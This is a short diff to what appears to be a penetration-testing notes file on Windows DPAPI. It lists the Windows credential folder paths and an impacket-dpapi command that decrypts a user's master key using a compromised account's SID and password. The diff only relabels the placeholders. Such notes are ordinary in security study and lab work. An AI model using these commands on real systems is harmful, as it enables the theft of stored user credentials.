@@ -945,10 +945,10 @@ C:\Users\$USER\AppData\Local\Microsoft\Credentials\
 C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
 ```
 
-1.Dump Decrypted key starts with `0x` 
+1.Dump Decrypted key starts with `0x` where sid is compomised_user
 
 ```bash
-impacket-dpapi masterkey -file "/path/to/file/locally/master" -sid S-1-<SNIP>-1107 -password 'password'
+impacket-dpapi masterkey -file "/path/to/file/locally/master" -sid S-1-<SNIP>-1107 -password 'compromised_password'
 ```
 Returns a long `MD4` key
 
